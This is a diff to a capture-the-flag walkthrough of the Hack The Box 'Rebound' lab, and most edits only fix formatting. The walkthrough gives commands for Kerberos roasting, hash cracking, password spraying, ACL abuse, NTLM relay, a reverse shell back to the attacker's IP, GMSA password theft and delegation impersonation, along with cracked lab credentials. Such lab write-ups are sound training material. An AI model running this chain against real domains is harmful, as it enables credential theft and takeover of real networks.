@@ -31,6 +31,7 @@ Connect to /Shared - but it's empty:
 ![image3](../resources/3e4f8c2522734356bf820fbf5874a32c.png)
 
 - Enumerate domain users with kerbrute and CME:
+
 ```bash
 ./kerbrute userenum --dc 10.129.229.114 -d rebound.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 
@@ -50,6 +51,7 @@ cat valid_users.txt | cut -d "\\" -f 2 | cut -d "(" -f 1 > valid_users
 
 ```
 - jjones - Require PreAuth not set:
+
 ```bash
 impacket-GetNPUsers rebound.htb/ -users valid_users -no-pass -dc-ip rebound.htb
 
@@ -80,11 +82,11 @@ OR use:
 
 ```bash
 sudo faketime -f +7h <command>
-
 sudo faketime -f +7h impacket-GetUserSPNs -target-domain rebound.htb -usersfilevalid_users -dc-ip rebound.htb rebound.htb/guest -no-pass
 
 ```
 - Get Service hashes:
+
 ```bash
 impacket-GetUserSPNs -target-domain rebound.htb -usersfilevalid_users -dc-ip rebound.htb rebound.htb/guest -no-pass
 
@@ -102,12 +104,15 @@ impacket-GetUserSPNs -target-domain rebound.htb -usersfilevalid_users -dc-ip reb
 
 \$krb5tgs\$18\$delegator\$\$REBOUND.HTB\$\***delegator\$**\*
 
+
 - For **\$krb5tgs\$18\$**:
+
 ```bash
 hashcat -m 19700 -a 0 hash_file18 /usr/share/wordlists/rockyou.txt
 
 ```
 - For **\$krb5tgs\$23\$**:
+
 ```bash
 hashcat -m 13100 -a 0 hash_file23 /usr/share/wordlists/rockyou.txt
 
@@ -116,14 +121,15 @@ hashcat -m 13100 -a 0 hash_file23 /usr/share/wordlists/rockyou.txt
 ![image11](../resources/ef6c5b8250954455a0aaaa744000a6dc.png)
 
 - Got credentials:
-**ldap_monitor : 1GR8t@\$\$4u**
+**ldap_monitor : 1GR8t@$$4u**
 
 
 ![image12](../resources/4a7d04c639344df1868e0885f96a06e3.png)
 
 - Password Spray:
+
 ```bash
-./kerbrute passwordspray valid_users '1GR8t@\$\$4u' --dc rebound.htb -d rebound.htb
+./kerbrute passwordspray valid_users '1GR8t@$$4u' --dc rebound.htb -d rebound.htb
 
 ```
 
@@ -135,7 +141,7 @@ hashcat -m 13100 -a 0 hash_file23 /usr/share/wordlists/rockyou.txt
 ![image14](../resources/3d7b2e9121294440bf080bbb2d36c69f.png)
 
 - Got credentials from password spraying:
-**oorend : 1GR8t@\$\$4u**
+**oorend : 1GR8t@$$4u**
 
 <https://github.com/CravateRouge/bloodyAD>
 
@@ -149,8 +155,9 @@ hashcat -m 13100 -a 0 hash_file23 /usr/share/wordlists/rockyou.txt
 ![image16](../resources/cbd40e7f8c1c4ae8a7f6062a9eecfcb6.png)
 
 - Using bloodyAD to see the groups ACL's:
+
 ```bash
-python bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@\$\$4u' --host rebound.htb get object ServiceMgmt --resolve-sd
+python bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@$$4u' --host rebound.htb get object ServiceMgmt --resolve-sd
 
 ```
 
@@ -166,9 +173,11 @@ nTSecurityDescriptor.ACL.2.ObjectType: Self
 
 "WRITE_VALIDATED to Self" here, means oorend can make changes concerning themselves in relation to the ServiceMgmt group - possibly adding themselves to the group.
 
+
 - We can try and add ourselves to the ServiceMgmt group:
+
 ```bash
-python bloodyAD.py -u oorend -p '1GR8t@\$\$4u' -d rebound.htb --host rebound.htb add groupMember SERVICEMGMT oorend
+python bloodyAD.py -u oorend -p '1GR8t@$$4u' -d rebound.htb --host rebound.htb add groupMember SERVICEMGMT oorend
 
 ```
 
@@ -177,7 +186,7 @@ python bloodyAD.py -u oorend -p '1GR8t@\$\$4u' -d rebound.htb --host rebound.htb
 OR
 
 ```bash
-python bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@\$\$4u' --host rebound.htb add groupMember 'CN=SERVICEMGMT,CN=USERS,DC=REBOUND,DC=HTB' "CN=oorend,CN=Users,DC=rebound,DC=htb"
+python bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host rebound.htb add groupMember 'CN=SERVICEMGMT,CN=USERS,DC=REBOUND,DC=HTB' "CN=oorend,CN=Users,DC=rebound,DC=htb"
 
 ```
 - We can check with:
@@ -185,8 +194,9 @@ python bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@\$\$4u' --host rebound.htb
 ![image19](../resources/e5521f3b63c14dcf86f439c312916e92.png)
 
 - Now that we are in the group - we can look into winrm_svc:
+
 ```bash
-python bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@\$\$4u' --host rebound.htb get object winrm_svc
+python bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@$$4u' --host rebound.htb get object winrm_svc
 
 ```
 
@@ -195,22 +205,25 @@ python bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@\$\$4u' --host rebound.htb
 Winrm_svc is part of the OU=Service Users
 
 - Since we are now part of the ServiceMgmt group - we can change the permissions for the Service Users OU
+
 ```bash
-python bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@\$\$4u' --host rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
+python bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
 
 ```
 
 ![image21](../resources/146184331ee0432ca9a2c6be69beb85b.png)
 
 - We now have FULL CONTROL over the OU and the objects inside the OU, ie. winrm_svc. So we can change winrm_svc password:
+
 ```bash
-python bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@\$\$4u' --host rebound.htb set password winrm_svc 'Password1!'
+python bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host rebound.htb set password winrm_svc 'Password1!'
 
 ```
 
 ![image22](../resources/9429e7cc52f04577bd3bbc29a8391289.png)
 
 - We can now log in using evil-winrm:
+
 ```bash
 evil-winrm -i rebound.htb -u winrm_svc -p Password1!
 
@@ -225,6 +238,7 @@ cat user.txt
 
 ```
 - Upload Sharphound (new)
+
 ```bash
 .\SharpHound.exe -c all
 
@@ -253,6 +267,7 @@ We find Tbrady and Administrator - and they just logged on/ might still be logge
 ![image26](../resources/0a1348e28848418e8201cf7d1282d9b8.png)
 
 - On Kali - Set up:
+
 ```bash
 sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.169.100:9999 &&
 
@@ -263,6 +278,7 @@ sudo python3 impacket-ntlmrelayx -t ldap://10.129.169.100 --no-wcf-server --esca
 ![image27](../resources/9e96bd7f67744b27ac29f66caf716d22.png)
 
 - On the victim:
+
 ```bash
 ./RemotePotato0.exe -m 2 -r 10.10.14.23 -x 10.10.14.23 -p 9999
 
@@ -271,6 +287,7 @@ sudo python3 impacket-ntlmrelayx -t ldap://10.129.169.100 --no-wcf-server --esca
 ![image28](../resources/b3cce8c44b784e08aff2f470c4517e79.png)
 
 - Crack with hashcat:
+
 ```bash
 hashcat -m 5600 hash_brady /usr/share/wordlists/rockyou.txt
 
@@ -279,6 +296,7 @@ hashcat -m 5600 hash_brady /usr/share/wordlists/rockyou.txt
 ![image29](../resources/1d6f68d67935478e9df0926537cacdcf.png)
 
 - Upload RunasCs.exe and run:
+
 ```bash
 .\RunasCs.exe tbrady 543BOMBOMBUNmanda cmd.exe -r 10.10.14.23:8888
 
@@ -296,7 +314,6 @@ Upload PowerView.ps1
 
 ```powershell
 . ./PowerView.ps1
-
 Get-DomainComputer -TrustedToAuth
 
 ```
@@ -309,9 +326,9 @@ Get-DomainComputer -TrustedToAuth
 ![image33](../resources/f3f294866b9d4655a3e32662789c1574.png)
 
 - Query delegator\$ to see its ACL's:
-```bash
-./bloodyAD.py -d rebound.htb -u tbrady -p '543BOMBOMBUNmanda' --host dc01.rebound.htb get object 'delegator\$' --resolve-sd
 
+```bash
+./bloodyAD.py -d rebound.htb -u tbrady -p '543BOMBOMBUNmanda' --host dc01.rebound.htb get object 'delegator$' --resolve-sd
 ```
 
 ![image34](../resources/fb2925f8387240afa78f7821e9359041.png)
@@ -319,8 +336,9 @@ Get-DomainComputer -TrustedToAuth
 We can see that tbrady has GENERIC_ALL on this account
 
 - **Get the GMSA password:**
+
 ```bash
-./bloodyAD.py -d rebound.htb -u tbrady -p '543BOMBOMBUNmanda' --host dc01.rebound.htb get object 'delegator\$' --resolve-sd --attr msDS-ManagedPassword
+./bloodyAD.py -d rebound.htb -u tbrady -p '543BOMBOMBUNmanda' --host dc01.rebound.htb get object 'delegator$' --resolve-sd --attr msDS-ManagedPassword
 
 ```
 
@@ -332,7 +350,7 @@ NTLM hash: **aad3b435b51404eeaad3b435b51404ee:e1630b0e18242439a50e9d8b5f5b7524**
 <https://medium.com/r3d-buck3t/how-to-abuse-resource-based-constrained-delegation-to-gain-unauthorized-access-36ac8337dd5a>
 
 ```bash
-impacket-getTGT 'rebound.htb/delegator\$@dc01.rebound.htb' -hashes aad3b435b51404eeaad3b435b51404ee:e1630b0e18242439a50e9d8b5f5b7524 -dc-ip 10.129.169.100
+impacket-getTGT 'rebound.htb/delegator$@dc01.rebound.htb' -hashes aad3b435b51404eeaad3b435b51404ee:e1630b0e18242439a50e9d8b5f5b7524 -dc-ip 10.129.169.100
 
 ```
 
@@ -365,7 +383,7 @@ If you don't have it like this you WILL get the error:
 Impacket-rbcd is a python script for handling the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer
 
 ```bash
-impacket-rbcd 'rebound.htb/delegator\$' -k -no-pass -delegate-from ldap_monitor -delegate-to 'delegator\$' -action write -use-ldaps -dc-ip 10.129.169.100 -debug
+impacket-rbcd 'rebound.htb/delegator$' -k -no-pass -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -use-ldaps -dc-ip 10.129.169.100 -debug
 
 ```
 
@@ -390,7 +408,7 @@ From BloodHound, we can see the SPN to use for delegate\$
 ![image42](../resources/ceb194de813248bdabed9d6154d5cbc1.png)
 
 ```bash
-impacket-getST -spn "browser/dc01.rebound.htb" -impersonate "dc01$" 'rebound.htb/ldap_monitor:1GR8t@\$\$4u' -dc-ip 10.129.169.100
+impacket-getST -spn "browser/dc01.rebound.htb" -impersonate "dc01$" 'rebound.htb/ldap_monitor:1GR8t@$$4u' -dc-ip 10.129.169.100
 
 ```
 
